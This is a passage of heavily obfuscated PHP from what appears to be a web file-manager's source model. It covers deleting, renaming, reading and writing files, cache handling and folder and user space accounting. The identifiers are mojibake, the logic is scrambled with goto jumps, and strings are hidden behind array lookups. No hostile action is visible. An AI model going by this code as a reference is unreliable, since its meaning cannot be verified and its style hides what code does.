array($f©—ÔÁº¸©[383] => array($f©—ÔÁº¸©[384], $c¦ÎÆì„é³)); Model($f©—ÔÁº¸©[2353])->where($eó«áÅ†Ç)->delete(); Model($f©—ÔÁº¸©[413])->where($eó«áÅ†Ç)->delete(); goto cÒáÕÛê•; Cƒƒ»èÚğñ: Model($f©—ÔÁº¸©[2334])->removeBySource($c¦ÎÆì„é³); $this->where($eó«áÅ†Ç)->delete(); Model($f©—ÔÁº¸©[422])->remove($dÙ¨­òÆˆ†); goto bŸÃ©ëˆ; bŸÃ©ëˆ: for ($CÀµÕĞæõ = 0; $CÀµÕĞæõ < count($c¦ÎÆì„é³); $CÀµÕĞæõ++) { $this->sourceCacheClear($c¦ÎÆì„é³[$CÀµÕĞæõ]); } goto b¾î§ í´; a²äæÜæ›®: $c¦ÎÆì„é³ = array_unique(array_filter($c¦ÎÆì„é³)); $dÙ¨­òÆˆ† = array_unique(array_filter($dÙ¨­òÆˆ†)); if (!$c¦ÎÆì„é³) { return !1; } goto fâÍ¨‰ê”; FÅ†ªÛ›”: $f©—ÔÁº¸© =& $_SERVER[‚Ğ°–—î]; $c¦ÎÆì„é³ = $c¦ÎÆì„é³ ? $c¦ÎÆì„é³ : array(); $dÙ¨­òÆˆ† = $dÙ¨­òÆˆ† ? $dÙ¨­òÆˆ† : array(); goto a²äæÜæ›®; cÒáÕÛê•: Model($f©—ÔÁº¸©[2356])->where($eó«áÅ†Ç)->delete(); Model($f©—ÔÁº¸©[505])->where($eó«áÅ†Ç)->delete(); Model($f©—ÔÁº¸©[2084])->removeBySource($c¦ÎÆì„é³); goto Cƒƒ»èÚğñ; b¾î§ í´: } public function rename($dÎÌ×ëÊ, $d¿æåË¬Ôõ) { goto DŠÁèƒø¯ì; AÉÀÄÜÙë¡: $B”¾Û»Ş = $BÓÈäÁŒÖ°[2342] . $E…ä‡ìØÛ™[$BÓÈäÁŒÖ°[461]]; if (isset(self::$cacheChildList[$B”¾Û»Ş])) { unset(self::$cacheChildList[$B”¾Û»Ş]); } return $Fê›éøƒâ; goto a¢ˆËº¯­¬; CŠÕ°¼çé¯: if (!$E…ä‡ìØÛ™[$BÓÈäÁŒÖ°[370]] == $BÓÈäÁŒÖ°[83]) { $B¡Ğ†ŠŠ’[$BÓÈäÁŒÖ°[372]] = get_path_ext($d¿æåË¬Ôõ); } Model($BÓÈäÁŒÖ°[505])->eventRename($dÎÌ×ëÊ, $E…ä‡ìØÛ™[$BÓÈäÁŒÖ°[28]], $d¿æåË¬Ôõ); $this->sourceCacheClear($dÎÌ×ëÊ); goto dˆ ¹¹ÈÕİ; DŠÁèƒø¯ì: $BÓÈäÁŒÖ° =& $_SERVER[‚Ğ°–—î]; $E…ä‡ìØÛ™ = $this->sourceInfo($dÎÌ×ëÊ); if (!$E…ä‡ìØÛ™) { return !1; } goto BĞÜäŒÊ˜¤; dˆ ¹¹ÈÕİ: $this->setNamePinyin($dÎÌ×ëÊ, $B¡Ğ†ŠŠ’[$BÓÈäÁŒÖ°[28]], !1); $this->updateModifyTime($E…ä‡ìØÛ™[$BÓÈäÁŒÖ°[461]]); $Fê›éøƒâ = $this->where(array($BÓÈäÁŒÖ°[383] => $dÎÌ×ëÊ))->data($B¡Ğ†ŠŠ’)->save(); goto AÉÀÄÜÙë¡; BĞÜäŒÊ˜¤: $a°ŒìÛâ¬† = $this->fileNameExist($E…ä‡ìØÛ™[$BÓÈäÁŒÖ°[461]], $d¿æåË¬Ôõ); if ($a°ŒìÛâ¬†) { return !1; } $B¡Ğ†ŠŠ’ = array($BÓÈäÁŒÖ°[386] => $d¿æåË¬Ôõ, $BÓÈäÁŒÖ°[524] => USER_ID); goto CŠÕ°¼çé¯; a¢ˆËº¯­¬: } public function setNamePinyin($A‘Á»¬—•›, $fŞó–ØÏÎç, $båéÑÎï‹… = true) { $fÊ˜« “ŒØ =& $_SERVER[‚Ğ°–—î]; $D»™Ù½ë = Input::check($fŞó–ØÏÎç, $fÊ˜« “ŒØ[528]); if ($båéÑÎï‹… && !$D»™Ù½ë) { return; } if (!$D»™Ù½ë) { $this->metaSet($A‘Á»¬—•›, $fÊ˜« “ŒØ[416], null); $this->metaSet($A‘Á»¬—•›, $fÊ˜« “ŒØ[415], null); return; } $c‘Ì¤ÜØ‡Ô = array($fÊ˜« “ŒØ[416] => str_replace($fÊ˜« “ŒØ[50], $fÊ˜« “ŒØ[33], Pinyin::encode($fŞó–ØÏÎç)), $fÊ˜« “ŒØ[415] => Pinyin::encode($fŞó–ØÏÎç, $fÊ˜« “ŒØ[529])); $this->metaSet($A‘Á»¬—•›, $c‘Ì¤ÜØ‡Ô); } public function getContent($d¥…‡¾‡Òô) { goto AÅ´öîº«”; AÅ´öîº«”: $bÛŞ°¦õ• =& $_SERVER[‚Ğ°–—î]; $Eôâé¼¼˜¥ = $this->fileInfoGet($d¥…‡¾‡Òô); if (!$Eôâé¼¼˜¥) { return !1; } goto A”Ô‹Ÿ¦ø©; E±©çâñ¥: return IO::getContent($Eôâé¼¼˜¥[$bÛŞ°¦õ•[75]]); goto C÷ª¶¶·ÙÌ; A”Ô‹Ÿ¦ø©: if ($Eôâé¼¼˜¥[$bÛŞ°¦õ•[77]] == 0) { return $bÛŞ°¦õ•[33]; } $eÓˆ‰Ñ‚‰ = $bÛŞ°¦õ•[2357] . $Eôâé¼¼˜¥[$bÛŞ°¦õ•[163]]; if ($Eôâé¼¼˜¥[$bÛŞ°¦õ•[77]] <= 1024 * 10) { $c‘˜½ÌÅ–Ş = Cache::get($eÓˆ‰Ñ‚‰); if (!$c‘˜½ÌÅ–Ş) { $c‘˜½ÌÅ–Ş = IO::getContent($Eôâé¼¼˜¥[$bÛŞ°¦õ•[75]]); Cache::set($eÓˆ‰Ñ‚‰, $c‘˜½ÌÅ–Ş); } return $c‘˜½ÌÅ–Ş; } goto E±©çâñ¥; C÷ª¶¶·ÙÌ: } public function setDesc($c­Õóõ×Üİ, $cŠù×Î…ÅÌ) { $EùÚÓÅĞô­ =& $_SERVER[‚Ğ°–—î]; Model($EùÚÓÅĞô­[505])->eventAddDesc($c­Õóõ×Üİ, $cŠù×Î…ÅÌ); return $this->metaSet($c­Õóõ×Üİ, $EùÚÓÅĞô­[405], $cŠù×Î…ÅÌ); } public function setContent($F¯Û×¹­ÑÃ, $AºœÏø§½ = '') { goto aŞ÷­¥Ïó‹; CšŒôì Ñ: if (!$b¨£åÎ´‚Ê) { return Model($dÙÒéâÍŒ[422])->remove($C¥Ğ½ªï‘Ò[$dÙÒéâÍŒ[419]]); } $this->folderSizeReset($eÖ‰­‹¾“[$dÙÒéâÍŒ[461]]); return !0; goto f­°À¥®Œ³; aŞ÷­¥Ïó‹: $dÙÒéâÍŒ =& $_SERVER[‚Ğ°–—î]; $eÖ‰­‹¾“ = $this->sourceInfo($F¯Û×¹­ÑÃ); $fÊóŞ°õ‡ì = $this->fileInfoGet($F¯Û×¹­ÑÃ); goto CÒÆø‚Ëµ; CÒÆø‚Ëµ: if (!$fÊóŞ°õ‡ì || !$eÖ‰­‹¾“) { return !1; } $C¥Ğ½ªï‘Ò = Model($dÙÒéâÍŒ[422])->addFileByContent($AºœÏø§½, $eÖ‰­‹¾“[$dÙÒéâÍŒ[28]]); $b¨£åÎ´‚Ê = $this->fileHistory($eÖ‰­‹¾“, $C¥Ğ½ªï‘Ò[$dÙÒéâÍŒ[419]], $C¥Ğ½ªï‘Ò[$dÙÒéâÍŒ[77]]); goto CšŒôì Ñ; f­°À¥®Œ³: } public function fileSubstr($FÊ¤óİáï, $aÒÇìšöÍ¨, $BÂå‡¢–÷ƒ) { $e˜òíÖé‚ = $this->fileInfoGet($FÊ¤óİáï); if (!$e˜òíÖé‚) { return !1; } return IO::fileSubstr($e˜òíÖé‚[$_SERVER[‚Ğ°–—î][75]], $aÒÇìšöÍ¨, $BÂå‡¢–÷ƒ); } public function fileInfoGet($cÇÍ åëá) { goto eÛ“‹†›µ¨; eÛ“‹†›µ¨: $f÷çö†åç² =& $_SERVER[‚Ğ°–—î]; $a««Ì = $this->sourceInfo($cÇÍ åëá); if (!$a««Ì || $a««Ì[$f÷çö†åç²[370]]) { return !1; } goto d‹¦‰Ãíë; d‹¦‰Ãíë: $fÌÁİ¿ŒÒø = $f÷çö†åç²[425] . $a««Ì[$f÷çö†åç²[419]]; $DõŸù“Û = _get(self::$cacheFileInfo, $fÌÁİ¿ŒÒø); if ($DõŸù“Û) { return $DõŸù“Û; } goto cñ¼Ù°¶ÚÆ; dÕ¾Â¥‹: return $CÏºÖ–ƒ«§; goto f§Œòõ¯ëİ; cñ¼Ù°¶ÚÆ: $CÏºÖ–ƒ«§ = Model($f÷çö†åç²[422])->fileInfo($a««Ì[$f÷çö†åç²[419]]); if ($CÏºÖ–ƒ«§) { $CÏºÖ–ƒ«§[$f÷çö†åç²[28]] = $a««Ì[$f÷çö†åç²[28]]; } self::$cacheFileInfo[$fÌÁİ¿ŒÒø] = $CÏºÖ–ƒ«§; goto dÕ¾Â¥‹; f§Œòõ¯ëİ: } private function folderChildrenNumber($EÊÃö¾ùŸ‘) { $eÇŸÔ²Í¸Í =& $_SERVER[‚Ğ°–—î]; $dŠÇŒ¡ñ  = $this->sourceInfo($EÊÃö¾ùŸ‘); $eƒÎ¡Şå¡È = array($eÇŸÔ²Í¸Í[525] => array($eÇŸÔ²Í¸Í[483], $dŠÇŒ¡ñ [$eÇŸÔ²Í¸Í[459]] . $EÊÃö¾ùŸ‘ . $eÇŸÔ²Í¸Í[484]), $eÇŸÔ²Í¸Í[396] => intval($dŠÇŒ¡ñ [$eÇŸÔ²Í¸Í[397]]), $eÇŸÔ²Í¸Í[518] => 1); $B‹Ñİ±›Ü = $this->where($eƒÎ¡Şå¡È)->count(); $bÍ˜Ã‰×´ = $this->where($eƒÎ¡Şå¡È)->where(array($eÇŸÔ²Í¸Í[518] => 0))->count(); return array($eÇŸÔ²Í¸Í[81] => $bÍ˜Ã‰×´, $eÇŸÔ²Í¸Í[82] => $B‹Ñİ±›Ü); } public function pathInfo($DØğÉ œ«, $E­°‘‹äÉ¾ = false) { goto aœìİ Äƒë; DİßÁ‹ñ´ˆ: if ($D…§ƒ×Î‚) { return $D…§ƒ×Î‚; } $eªèÕ¬ëÊË = $this->sourceInfo($DØğÉ œ«); if (!$eªèÕ¬ëÊË) { return !1; } goto BÍõÙ¦µµ‘; aœìİ Äƒë: $Fõµ´ƒ‰õ =& $_SERVER[‚Ğ°–—î]; $D—÷×‘ä¾º = $Fõµ´ƒ‰õ[411] . intval($E­°‘‹äÉ¾) . $Fõµ´ƒ‰õ[412] . $DØğÉ œ«; $D…§ƒ×Î‚ = _get(self::$cachePathInfo, $D—÷×‘ä¾º); goto DİßÁ‹ñ´ˆ; BÍõÙ¦µµ‘: $eªèÕ¬ëÊË = $this->_listDataApplyItem($eªèÕ¬ëÊË, $E­°‘‹äÉ¾); self::$cachePathInfo[$D—÷×‘ä¾º] = $eªèÕ¬ëÊË; return $eªèÕ¬ëÊË; goto e°ƒÌÆ©í; e°ƒÌÆ©í: } public static $cachePathInfoMore = array(); public function pathInfoMore($b«‘Ä¥½Ğ¹) { goto BêÃ¾…; A³ª‘î¨ã‹: $Cæ ¶¶‚‘ù = $this->pathInfo($b«‘Ä¥½Ğ¹); if (!$Cæ ¶¶‚‘ù) { return !1; } if ($Cæ ¶¶‚‘ù[$FïÔî¥Äœ´[370]] == $FïÔî¥Äœ´[83]) { $Cæ ¶¶‚‘ù[$FïÔî¥Äœ´[80]] = $this->folderChildrenNumber($b«‘Ä¥½Ğ¹); } goto fÔ‡•¢à•; BêÃ¾…: $FïÔî¥Äœ´ =& $_SERVER[‚Ğ°–—î]; $fÇã¢Í¥İÃ = _get(self::$cachePathInfoMore, $b«‘Ä¥½Ğ¹); if ($fÇã¢Í¥İÃ) { return $fÇã¢Í¥İÃ; } goto A³ª‘î¨ã‹; fÔ‡•¢à•: self::$cachePathInfoMore[$b«‘Ä¥½Ğ¹] = $Cæ ¶¶‚‘ù; return $Cæ ¶¶‚‘ù; goto c¯Îæè¨·ğ; c¯Îæè¨·ğ: } public function sourceInfo($aâ¤òà¬‹) { goto EËÕ©ÕÒ¯; BÔ£ŸÊËåÔ: self::$cacheSourceInfo[$e´‹÷³‘´Á] = $b—Ú´‹–Éª; return self::$cacheSourceInfo[$e´‹÷³‘´Á]; goto A…óé¶Äï; Aä°Ïˆ´: $F£êöãŠĞÃ = _get(self::$cacheSourceInfo, $e´‹÷³‘´Á); if ($F£êöãŠĞÃ) { return $F£êöãŠĞÃ; } $b—Ú´‹–Éª = $this->where(array($a¸Ç¹›Û“[369] => $aâ¤òà¬‹))->find(); goto BÔ£ŸÊËåÔ; EËÕ©ÕÒ¯: $a¸Ç¹›Û“ =& $_SERVER[‚Ğ°–—î]; if (!$aâ¤òà¬‹) { return array(); } $e´‹÷³‘´Á = $a¸Ç¹›Û“[410] . $aâ¤òà¬‹; goto Aä°Ïˆ´; A…óé¶Äï: } public function sourceCacheClear($aÒ‰Ôºªš = false) { if ($aÒ‰Ôºªš == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[‚Ğ°–—î][410] . $aÒ‰Ôºªš]); } public function pathInfoByPath($FÏŠÆ—Æªœ, $DÈ‰Ê‹Á‹) { $fÉÔ«×Ò¢™ =& $_SERVER[‚Ğ°–—î]; $E‹­¥±§°œ = !$DÈ‰Ê‹Á‹ ? array() : explode($fÉÔ«×Ò¢™[8], trim($DÈ‰Ê‹Á‹, $fÉÔ«×Ò¢™[8])); $bÌ®ãëæòê = $FÏŠÆ—Æªœ; foreach ($E‹­¥±§°œ as $cƒÒçŒˆ˜ò) { $A„›°ˆÅ—’ = array($fÉÔ«×Ò¢™[461] => $bÌ®ãëæòê, $fÉÔ«×Ò¢™[28] => $cƒÒçŒˆ˜ò); $Fç°ƒ©¶åš = $this->where($A„›°ˆÅ—’)->select(); if (!$Fç°ƒ©¶åš) { return !1; } $Fç°ƒ©¶åš = array_sort_by($Fç°ƒ©¶åš, $fÉÔ«×Ò¢™[397]); $bÌ®ãëæòê = $Fç°ƒ©¶åš[0][$fÉÔ«×Ò¢™[369]]; } return $this->pathInfo($bÌ®ãëæòê, !0); } protected function updateModifyTime($F‚»¬œÓ ƒ) { goto EğÒÒ„Ø¸–; fù’“Õé¤ô: foreach ($F‚»¬œÓ ƒ as $C¨ñÔ£Ì² => $aŒá‘Å©Àˆ) { $F‚»¬œÓ ƒ[$C¨ñÔ£Ì²] = intval($aŒá‘Å©Àˆ); } $C»…Š™Œ®š = array($B–‰Œ´ö[369] => array($B–‰Œ´ö[7], $F‚»¬œÓ ƒ)); $eŒÓ‰ãŒ¸Ì = array($B–‰Œ´ö[524] => USER_ID, $B–‰Œ´ö[390] => time()); goto D¡¢Á²µïæ; EğÒÒ„Ø¸–: $B–‰Œ´ö =& $_SERVER[‚Ğ°–—î]; if (!$F‚»¬œÓ ƒ) { return; } if (!is_array($F‚»¬œÓ ƒ)) { $F‚»¬œÓ ƒ = array($F‚»¬œÓ ƒ); } goto fù’“Õé¤ô; D¡¢Á²µïæ: $this->where($C»…Š™Œ®š)->save($eŒÓ‰ãŒ¸Ì); goto c–§îæÄ‚; c–§îæÄ‚: } public function folderSizeReset($Bóù›Ù£¬¡) { goto E§…§ˆïö; Bó–‡óğù·: $AÄé¬ñøá² = $bãİâ¥²¥» - intval($BŠÃÎÔ­[$eÇøŒÎ¢ë[77]]); if ($AÄé¬ñøá² == 0) { return CacheLock::unlock($e÷¶Ğ ÚŒ); } $this->where(array($eÇøŒÎ¢ë[383] => $Bóù›Ù£¬¡))->setField($eÇøŒÎ¢ë[77], $bãİâ¥²¥»); goto f¥«Ïø¢‘ò; E§…§ˆïö: $eÇøŒÎ¢ë =& $_SERVER[‚Ğ°–—î]; if ($this->statusIgnoreResetSpace) { return; } $e÷¶Ğ ÚŒ = $eÇøŒÎ¢ë[2358] . $Bóù›Ù£¬¡; goto Fì¹Ğì‘Š; CÒÔ×°¹§ğ: $fôß¤†ÒÑº = array($eÇøŒÎ¢ë[368] => $Bóù›Ù£¬¡, $eÇøŒÎ¢ë[396] => 0); $bãİâ¥²¥» = $this->where($fôß¤†ÒÑº)->sum($eÇøŒÎ¢ë[77]); $bãİâ¥²¥» = intval($bãİâ¥²¥»); goto Bó–‡óğù·; Fì¹Ğì‘Š: CacheLock::lock($e÷¶Ğ ÚŒ, 20); $this->sourceCacheClear($Bóù›Ù£¬¡); $BŠÃÎÔ­ = $this->sourceInfo($Bóù›Ù£¬¡); goto CÒÔ×°¹§ğ; f¥«Ïø¢‘ò: $DÎˆ¨…ªòÌ = $this->parentLevelArray($BŠÃÎÔ­[$eÇøŒÎ¢ë[459]]); if ($DÎˆ¨…ªòÌ) { $fôß¤†ÒÑº = array($eÇøŒÎ¢ë[369] => array($eÇøŒÎ¢ë[384], $DÎˆ¨…ªòÌ)); if ($AÄé¬ñøá² < 0) { $fôß¤†ÒÑº[$eÇøŒÎ¢ë[77]] = array($eÇøŒÎ¢ë[930], abs($AÄé¬ñøá²)); } $this->where($fôß¤†ÒÑº)->setAdd($eÇøŒÎ¢ë[77], $AÄé¬ñøá²); } $this->targetSpaceUpdate($BŠÃÎÔ­[$eÇøŒÎ¢ë[371]], $BŠÃÎÔ­[$eÇøŒÎ¢ë[456]]); goto fğô¶¬¨¸; fğô¶¬¨¸: CacheLock::unlock($e÷¶Ğ ÚŒ); goto E‚“áÛ„íö; E‚“áÛ„íö: } public function folderSizeResetChildren($A¬»–»Öéì) { goto EÙÉÜäâ; EÙÉÜäâ: $F§Îó¸­ˆ =& $_SERVER[‚Ğ°–—î]; $this->sourceCacheClear($A¬»–»Öéì); $cØî†ôà‹ = $this->sourceInfo($A¬»–»Öéì); goto a²´®óµàÑ; a²´®óµàÑ: $e¬êÓ—°±š = array($F§Îó¸­ˆ[518] => 1, $F§Îó¸­ˆ[525] => array($F§Îó¸­ˆ[483], $cØî†ôà‹[$F§Îó¸­ˆ[459]] . $A¬»–»Öéì . $F§Îó¸­ˆ[484])); $eÆãÀÕÒ = $F§Îó¸­ˆ[2359]; $d÷ñòÖÎ†‚ = $this->field($eÆãÀÕÒ)->where($e¬êÓ—°±š)->select(); goto eÀ©ƒà÷ëÆ; eÀ©ƒà÷ëÆ: $e¬êÓ—°±š[$F§Îó¸­ˆ[370]] = 0; $Cõ•ÛÓŒä = $this->field($eÆãÀÕÒ)->where($e¬êÓ—°±š)->select(); if (!$Cõ•ÛÓŒä) { return; } goto aóƒÁÄöÑ; aóƒÁÄöÑ: $d÷ñòÖÎ†‚[] = $cØî†ôà‹; $d÷ñòÖÎ†‚ = array_to_keyvalue($d÷ñòÖÎ†‚, $F§Îó¸­ˆ[369]); foreach ($d÷ñòÖÎ†‚ as $aø³—ÓôßÁ => $dãôŞ·†) { $d÷ñòÖÎ†‚[$aø³—ÓôßÁ][$F§Îó¸­ˆ[2360]] = $d÷ñòÖÎ†‚[$aø³—ÓôßÁ][$F§Îó¸­ˆ[77]]; $d÷ñòÖÎ†‚[$aø³—ÓôßÁ][$F§Îó¸­ˆ[77]] = 0; } goto EÍæã©ğñÉ; dÒ£Â°ˆÓ: foreach ($d÷ñòÖÎ†‚ as $dãôŞ·†) { if ($dãôŞ·†[$F§Îó¸­ˆ[77]] == $dãôŞ·†[$F§Îó¸­ˆ[2360]]) { continue; } $E†Öã˜Å—à[] = array($F§Îó¸­ˆ[369], $dãôŞ·†[$F§Îó¸­ˆ[369]], $F§Îó¸­ˆ[77], $dãôŞ·†[$F§Îó¸­ˆ[77]]); } $this->saveAll($E†Öã˜Å—à); goto c÷—Ö‡Ş­ø; EÍæã©ğñÉ: foreach ($Cõ•ÛÓŒä as $dãôŞ·†) { $AÃ«ÄÒôÆ = $dãôŞ·†[$F§Îó¸­ˆ[461]] . $F§Îó¸­ˆ[33]; if (!isset($d÷ñòÖÎ†‚[$AÃ«ÄÒôÆ])) { continue; } if ($dãôŞ·†[$F§Îó¸­ˆ[397]] == $d÷ñòÖÎ†‚[$AÃ«ÄÒôÆ][$F§Îó¸­ˆ[397]]) { $d÷ñòÖÎ†‚[$AÃ«ÄÒôÆ][$F§Îó¸­ˆ[77]] += $dãôŞ·†[$F§Îó¸­ˆ[77]]; } } foreach ($d÷ñòÖÎ†‚ as $dãôŞ·†) { $dÀƒöù˜à = $this->parentLevelArray($dãôŞ·†[$F§Îó¸­ˆ[459]]); foreach ($dÀƒöù˜à as $AÃ«ÄÒôÆ) { $AÃ«ÄÒôÆ = $AÃ«ÄÒôÆ . $F§Îó¸­ˆ[33]; if (!isset($d÷ñòÖÎ†‚[$AÃ«ÄÒôÆ])) { continue; } if ($dãôŞ·†[$F§Îó¸­ˆ[397]] == $d÷ñòÖÎ†‚[$AÃ«ÄÒôÆ][$F§Îó¸­ˆ[397]]) { $d÷ñòÖÎ†‚[$AÃ«ÄÒôÆ][$F§Îó¸­ˆ[77]] += $dãôŞ·†[$F§Îó¸­ˆ[77]]; } } } $E†Öã˜Å—à = array(); goto dÒ£Â°ˆÓ; c÷—Ö‡Ş­ø: } public function userSpaceReset($DÄŒ­Èà = false) { $aÚçß¢ ì =& $_SERVER[‚Ğ°–—î]; $d¼Ì³•ÄÙé = $this->where(array($aÚçß¢ ì[371] => self::TYPE_USER, $aÚçß¢ ì[456] => $DÄŒ­Èà, $aÚçß¢ ì[370] => 0))->sum($aÚçß¢ ì[77]); Model($aÚçß¢ ì[474])->userEdit($DÄŒ­Èà, array($aÚçß¢ ì[2093] => $d¼Ì³•ÄÙé)); } public function targetSpaceUpdate($a‡íÆ¹¡, $FĞØ³–Âãô) { $BÌÅâ†•İ« =& $_SERVER[‚Ğ°–—î]; if (!$FĞØ³–Âãô) { return; } if (!in_array($a‡íÆ¹¡, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $dĞÒÎÂ™ç“ = $this->targetSpaceSize($a‡íÆ¹¡, $FĞØ³–Âãô); if ($a‡íÆ¹¡ == self::TYPE_USER) { Model($BÌÅâ†•İ«[474])->userEdit($FĞØ³–Âãô, array($BÌÅâ†•İ«[2093] => $dĞÒÎÂ™ç“)); } else { if ($a‡íÆ¹¡ == self::TYPE_GROUP) { Model($BÌÅâ†•İ«[458])->groupEdit($FĞØ³–Âãô, array($BÌÅâ†•İ«[2093] => $dĞÒÎÂ™ç“)); } } } public function targetSpaceSize($E‚ÕÒˆŸğ‚, $aåãæ×‚›) { goto C†©£“é; C†©£“é: $aÛË®ë¯ù” =& $_SERVER[‚Ğ°–—î]; $FÖ½ŠÄšÁ = $this->sourceRoot($E‚ÕÒˆŸğ‚, $aåãæ×‚›, !0); if (!$FÖ½ŠÄšÁ) { return 0; } goto e†ŒùªÓ; dÉöù¶öè: $cÅÌ§òç±Ì = array_to_keyvalue($cÅÌ§òç±Ì, $aÛË®ë¯ù”[33], $aÛË®ë¯ù”[369]); $cÅÌ§òç±Ì = array_unique(array_filter($cÅÌ§òç±Ì)); if ($cÅÌ§òç±Ì) { $fÃø¯¯šãõ = array($aÛË®ë¯ù”[383] => array($aÛË®ë¯ù”[384], $cÅÌ§òç±Ì)); $E‡ÁÏàËØÚ += floatval($this->where($fÃø¯¯šãõ)->sum($aÛË®ë¯ù”[77])); } goto A»Ç·ÜŞ»ä; A»Ç·ÜŞ»ä: return $E‡ÁÏàËØÚ; goto cÀÀõ½ ¦×; e†ŒùªÓ: $E‡ÁÏàËØÚ = floatval($FÖ½ŠÄšÁ[$aÛË®ë¯ù”[77]]); $fÃø¯¯šãõ = array($aÛË®ë¯ù”[525] => array($aÛË®ë¯ù”[483], $aÛË®ë¯ù”[470] . $FÖ½ŠÄšÁ[$aÛË®ë¯ù”[369]] . $aÛË®ë¯ù”[484])); $cÅÌ§òç±Ì = Model($aÛË®ë¯ù”[395])->field($aÛË®ë¯ù”[383])->where($fÃø¯¯šãõ)->select(); goto dÉöù¶öè; cÀÀõ½ ¦×: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Eğ›“‡ˆ¢) { return $this->fileTypeProfile($Eğ›“‡ˆ¢, SourceModel::TYPE_USER); } public function groupFileTypeProfile($C¹Ò÷‘ñæŒ) { return $this->fileTypeProfile($C¹Ò÷‘ñæŒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($C¦äâĞÌ˜, $E‰Øâö›) { goto aæôìå§³è; Dâˆ™¼Û§¹: foreach ($c»ù«ùÒÌˆ as $c“É‰êÇ÷Ş => $dè‘Ê‹Š¡×) { $bÇ£ÊàˆŞ©[$EÓ¶Ó¾İÒò[372]] = $this->fileTypeWhere($c“É‰êÇ÷Ş); $BÓ±Ôí…[$c“É‰êÇ÷Ş] = array($EÓ¶Ó¾İÒò[2363] => $dè‘Ê‹Š¡×[$EÓ¶Ó¾İÒò[28]], $EÓ¶Ó¾İÒò[2364] => $this->where($bÇ£ÊàˆŞ©)->count(), $EÓ¶Ó¾İÒò[520] => $this->where($bÇ£ÊàˆŞ©)->sum($EÓ¶Ó¾İÒò[77])); } Cache::set($aéŒ–ó–šâ, $BÓ±Ôí…, 1200); return $BÓ±Ôí…; goto eó¡ò¶§«°; aæôìå§³è: $EÓ¶Ó¾İÒò =& $_SERVER[‚Ğ°–—î]; $aéŒ–ó–šâ = $EÓ¶Ó¾İÒò[2361] . $C¦äâĞÌ˜ . $EÓ¶Ó¾İÒò[70] . $E‰Øâö›; $E•ê¾©Ğ’› = Cache::get($aéŒ–ó–šâ); goto FğÖƒø†Ê¡; FğÖƒø†Ê¡: if ($E•ê¾©Ğ’›) { return $E•ê¾©Ğ’›; } $bÇ£ÊàˆŞ© = array($EÓ¶Ó¾İÒò[518] => 0); if ($C¦äâĞÌ˜ != !1) { $bÇ£ÊàˆŞ©[$EÓ¶Ó¾İÒò[456]] = $C¦äâĞÌ˜; $bÇ£ÊàˆŞ©[$EÓ¶Ó¾İÒò[371]] = $E‰Øâö›; } goto B¯É²‰ªÌ; B¯É²‰ªÌ: $BÓ±Ôí… = array(); $BÓ±Ôí…[$EÓ¶Ó¾İÒò[2362]] = array($EÓ¶Ó¾İÒò[2363] => LNG($EÓ¶Ó¾İÒò[2362]), $EÓ¶Ó¾İÒò[2364] => $this->where($bÇ£ÊàˆŞ©)->count(), $EÓ¶Ó¾İÒò[520] => $this->where($bÇ£ÊàˆŞ©)->sum($EÓ¶Ó¾İÒò[77])); $c»ù«ùÒÌˆ = KodIO::fileTypeList(); goto Dâˆ™¼Û§¹; eó¡ò¶§«°: } public function fileNameExist($bğÏŠåÛÎ‘, $dïó›ËØ±…) { $dÅÍŠ¦‰… =& $_SERVER[‚Ğ°–—î]; $BÏŒŒœÀ = $this->childList($bğÏŠåÛÎ‘); foreach ($BÏŒŒœÀ as $d±ç…öÛµÈ) { if ($d±ç…öÛµÈ[$dÅÍŠ¦‰…[28]] == $dïó›ËØ±…) { return $d±ç…öÛµÈ[$dÅÍŠ¦‰…[369]]; } } return !1; } public function childList($dã½Äô‘¾®) { goto dç‚›ï”ãç; dç‚›ï”ãç: $cİ™„æ¿¹Ÿ =& $_SERVER[‚Ğ°–—î]; $DŒ°¿˜åÍ‚ = $cİ™„æ¿¹Ÿ[2342] . $dã½Äô‘¾®; if (isset(self::$cacheChildList[$DŒ°¿˜åÍ‚])) { return self::$cacheChildList[$DŒ°¿˜åÍ‚]; } goto DŸ¬æ®‚çÜ; DŸ¬æ®‚çÜ: $F“è¦î‰Ğ¡ = array($cİ™„æ¿¹Ÿ[461] => intval($dã½Äô‘¾®), $cİ™„æ¿¹Ÿ[397] => 0); $D¨ÓâÆ¬Ë­ = $this->where($F“è¦î‰Ğ¡)->select(); $D¨ÓâÆ¬Ë­ = $D¨ÓâÆ¬Ë­ ? $D¨ÓâÆ¬Ë­ : array(); goto f‘½„á˜ß; f‘½„á˜ß: self::$cacheChildList[$DŒ°¿˜åÍ‚] = $D¨ÓâÆ¬Ë­; foreach ($D¨ÓâÆ¬Ë­ as $Eù”ª³²µ) { $DŒ°¿˜åÍ‚ = $cİ™„æ¿¹Ÿ[410] . $Eù”ª³²µ[$cİ™„æ¿¹Ÿ[369]]; self::$cacheSourceInfo[$DŒ°¿˜åÍ‚] = $Eù”ª³²µ; } return $D¨ÓâÆ¬Ë­; goto aËÑÕæÚ“š; aËÑÕæÚ“š: } public function fileNameAuto($FáÜ´ßëæ–, $e•Öİ’š†Š, $ešÈ¤ÊêÑ® = REPEAT_RENAME, $C¹«×ÂÖŒÑ = false) { $E’ƒ‡¸Óš =& $_SERVER[‚Ğ°–—î]; $FÁ œêøÆ› = $this->childList($FáÜ´ßëæ–); $Cì³Çƒ¾çÏ = array_to_keyvalue($FÁ œêøÆ›, $E’ƒ‡¸Óš[33], $E’ƒ‡¸Óš[28]); return $this->fileNameAutoGet($Cì³Çƒ¾çÏ, $e•Öİ’š†Š, $ešÈ¤ÊêÑ®, $C¹«×ÂÖŒÑ); } public function fileNameAutoGet($AĞ¥ƒùã, $e¼ãÓÌ‰, $E‡Ûº¤·Š, $a­Ğ™ä©†ë) { $BÏù¦£¶å‹ =& $_SERVER[‚Ğ°–—î]; if ($E‡Ûº¤·Š == REPEAT_REPLACE || !$AĞ¥ƒùã || !in_array_not_case($e¼ãÓÌ‰, $AĞ¥ƒùã) || $a­Ğ™ä©†ë && $E‡Ûº¤·Š != REPEAT_RENAME_FOLDER) { return $e¼ãÓÌ‰; } if ($E‡Ûº¤·Š == REPEAT_SKIP) { return !1; } $eáÕ©£’“Ÿ = $BÏù¦£¶å‹[91] . get_path_ext($e¼ãÓÌ‰); $eáÕ©£’“Ÿ = $eáÕ©£’“Ÿ == 